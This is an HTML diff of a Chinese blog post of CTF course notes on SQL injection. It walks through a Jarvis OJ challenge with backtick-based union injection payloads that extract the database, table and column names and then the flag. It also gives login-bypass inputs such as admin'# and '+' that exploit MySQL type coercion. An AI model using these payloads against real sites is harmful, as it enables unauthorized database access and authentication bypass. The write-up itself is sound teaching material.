@@ -62,58 +62,81 @@
 
   <div class="post-content">
     <p>本文是对安全牛《CTF从入门到提升》课程课时8的记录</p>
-<h2 id="desc语法"><a href="#desc语法" class="headerlink" title="desc语法"></a>desc语法</h2><p>{DESCRIBE | DESC} tbl_name [col_name | wild]<br>DESCRIBE提供有关一个表的列信息。col_name可以是一个列名或是一个包含SQL通配符”%”和”_”的字符串</p>
+<h2 id="desc语法">desc语法</h2>
+<p>{DESCRIBE | DESC} tbl_name [col_name | wild]<br>
+DESCRIBE提供有关一个表的列信息。col_name可以是一个列名或是一个包含SQL通配符&quot;%“和”_&quot;的字符串</p>
 <p>值得注意的是即使col_name是不存在的，desc也不会报错，只是会返回Empty set.这一点在下面的例题中有使用到</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p>
-<h3 id="拿到源代码-这个点以后再讲"><a href="#拿到源代码-这个点以后再讲" class="headerlink" title="拿到源代码(这个点以后再讲)"></a>拿到源代码(这个点以后再讲)</h3><p>访问<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~<br>再右键查看源代码就可以看到index.php的内容</p>
+<h2 id="例题">例题</h2>
+<p><a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p>
+<h3 id="拿到源代码-这个点以后再讲">拿到源代码(这个点以后再讲)</h3>
+<p>访问<a href="http://web.jarvisoj.com:32794/index.php~" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php~</a><br>
+再右键查看源代码就可以看到index.php的内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>代码的分析如下:</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_&#123;$table&#125;`</span><br></pre></td></tr></table></figure>
 <p>这句如果报错的话会执行Hacker(),所以这句一定不能报错，而且代入到下面的</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'flag&#123;xxx&#125;'</span> <span class="keyword">from</span> secret_&#123;$<span class="keyword">table</span>&#125;</span><br></pre></td></tr></table></figure>
-<p>要能够注入出数据<br>这里就要运用上文提到的col_name不存在时，desc也不会报错的特性，不过首先我们了解一下sql中的反引号``</p>
-<h3 id="sql语句中的反引号"><a href="#sql语句中的反引号" class="headerlink" title="sql语句中的反引号``"></a>sql语句中的反引号``</h3><h4 id="1-反引号常规用法"><a href="#1-反引号常规用法" class="headerlink" title="1.反引号常规用法"></a>1.反引号常规用法</h4><p>反引号``在sql语句中一般用于区分MYSQL的保留字与普通字符，比如我想要新建一个叫做select的库时，就要使用``把select括起来</p>
+<p>要能够注入出数据<br>
+这里就要运用上文提到的col_name不存在时，desc也不会报错的特性，不过首先我们了解一下sql中的反引号``</p>
+<h3 id="sql语句中的反引号">sql语句中的反引号``</h3>
+<h4 id="1-反引号常规用法">1.反引号常规用法</h4>
+<p>反引号``在sql语句中一般用于区分MYSQL的保留字与普通字符，比如我想要新建一个叫做select的库时，就要使用``把select括起来</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="string">`select`</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="2-反引号代替空格"><a href="#2-反引号代替空格" class="headerlink" title="2.反引号代替空格"></a>2.反引号代替空格</h4><p>可以用反引号``代替空格,比如</p>
+<h4 id="2-反引号代替空格">2.反引号代替空格</h4>
+<p>可以用反引号``代替空格,比如</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span><span class="string">``</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
 <p>的效果和</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
 <p>是一样的</p>
-<h4 id="3-desc的反引号"><a href="#3-desc的反引号" class="headerlink" title="3.desc的反引号"></a>3.desc的反引号</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `user` `id`;</span><br></pre></td></tr></table></figure>
+<h4 id="3-desc的反引号">3.desc的反引号</h4>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc `user` `id`;</span><br></pre></td></tr></table></figure>
 <p>的效果和</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc user id;</span><br></pre></td></tr></table></figure>
 <p>的效果是一样的</p>
-<h3 id="进一步注入"><a href="#进一步注入" class="headerlink" title="进一步注入"></a>进一步注入</h3><p>按照上文的思路和``的特性，我们可以构造出这样的语句</p>
+<h3 id="进一步注入">进一步注入</h3>
+<p>按照上文的思路和``的特性，我们可以构造出这样的语句</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `union <span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span><span class="string">`;</span></span><br><span class="line"><span class="string">select 'flag&#123;xxx&#125;' from secret_test`</span> <span class="string">`union select database() limit 1 offset 1;</span></span><br></pre></td></tr></table></figure>
-<p>拿到库名为61d300<br>之所以要加上limit 1 offset 1是因为最后输出的时候</p>
+<p>拿到库名为61d300<br>
+之所以要加上limit 1 offset 1是因为最后输出的时候</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $ret[0];</span><br></pre></td></tr></table></figure>
-<p>只会输出第一个结果，如果不加limit 1 offset 1的话还是会返回flag{xxx}<br>后面就是正常的诸如操作了</p>
+<p>只会输出第一个结果，如果不加limit 1 offset 1的话还是会返回flag{xxx}<br>
+后面就是正常的诸如操作了</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span><span class="string">`;</span></span><br><span class="line"><span class="string">select 'flag&#123;xxx&#125;' from secret_test`</span> <span class="string">`union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 1;</span></span><br></pre></td></tr></table></figure>
 <p>得到存在表secret_flag,secret_test</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7365637265745f666c6167</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span><span class="string">`;</span></span><br><span class="line"><span class="string">select 'flag&#123;xxx&#125;' from secret_test`</span> <span class="string">`union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1 offset 1;</span></span><br></pre></td></tr></table></figure>
-<p>拿到列flagUwillNeverKnow </p>
+<p>拿到列flagUwillNeverKnow</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc `secret_test` `union <span class="keyword">select</span> <span class="keyword">group_concat</span>(flagUwillNeverKnow) <span class="keyword">from</span> secret_flag <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span><span class="string">`;</span></span><br><span class="line"><span class="string">select 'flag&#123;xxx&#125;' from secret_test`</span> <span class="string">`union select group_concat(flagUwillNeverKnow) from secret_flag limit 1 offset 1;</span></span><br></pre></td></tr></table></figure>
 <p>拿到flag</p>
-<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>查询语句如下:</p>
+<h2 id="万能密码">万能密码</h2>
+<p>查询语句如下:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
-<h4 id="1-用户名admin’"><a href="#1-用户名admin’" class="headerlink" title="1.用户名admin’#"></a>1.用户名admin’#</h4><p>利用#注释掉后面的语句</p>
-<h4 id="2-用户名’-’-密码’-’"><a href="#2-用户名’-’-密码’-’" class="headerlink" title="2.用户名’+’ 密码’+’"></a>2.用户名’+’ 密码’+’</h4><p>这个是运用了mysql弱类型转换的问题<br>mysql中</p>
+<h4 id="1-用户名admin’">1.用户名admin’#</h4>
+<p>利用#注释掉后面的语句</p>
+<h4 id="2-用户名’-’-密码’-’">2.用户名’+’ 密码’+’</h4>
+<p>这个是运用了mysql弱类型转换的问题<br>
+mysql中</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'aaa'</span>+<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 <p>会返回1，也就是说这时mysql会将不以数字开头的字符串转换成0处理,因此</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'a'</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-<p>是会返回1(True)的<br>当用户名和密码都是’+’时，sql语句变成</p>
+<p>是会返回1(True)的<br>
+当用户名和密码都是’+'时，sql语句变成</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span>+<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>+<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
 <p>相当于是</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="number">0</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
 <p>只要用户名和密码不是以数字开头的就可以查询出来,数字开头的话是不行的(如果是’000aab’这样的也可以)</p>
-<h4 id="3-用户名aaa’-’-密码aaa’-’"><a href="#3-用户名aaa’-’-密码aaa’-’" class="headerlink" title="3.用户名aaa’=’ 密码aaa’=’"></a>3.用户名aaa’=’ 密码aaa’=’</h4><p>代入sql语句得</p>
+<h4 id="3-用户名aaa’-’-密码aaa’-’">3.用户名aaa’=’ 密码aaa’=’</h4>
+<p>代入sql语句得</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'aaa'</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'aaa'</span>=<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
-<p>mysql会先查询username=’aaa’,这时返回0(False)，然后0和’’比较返回1(True)，password部分也是同理<br>也就是相当于执行了</p>
+<p>mysql会先查询username=‘aaa’,这时返回0(False)，然后0和’'比较返回1(True)，password部分也是同理<br>
+也就是相当于执行了</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
-<h2 id="N"><a href="#N" class="headerlink" title="\N"></a>\N</h2><p>\N在mysql中是NULL的意思，使用它时可以省略空格，比如</p>
+<h2 id="N">\N</h2>
+<p>\N在mysql中是NULL的意思，使用它时可以省略空格，比如</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>\Nfrom <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
-<p>有啥用呢?我也不知道……</p>
-<h2 id="唠叨几句"><a href="#唠叨几句" class="headerlink" title="唠叨几句"></a>唠叨几句</h2><p>到这一讲sql注入就讲完了，接下来是文件上传的部分。<br>最近因为一些事情整个人都很不好，对未来也没什么奢望，只是希望接下来能好过一些吧。</p>
+<p>有啥用呢?我也不知道…</p>
+<h2 id="唠叨几句">唠叨几句</h2>
+<p>到这一讲sql注入就讲完了，接下来是文件上传的部分。<br>
+最近因为一些事情整个人都很不好，对未来也没什么奢望，只是希望接下来能好过一些吧。</p>
 
   </div>
   <div class="post-meta">
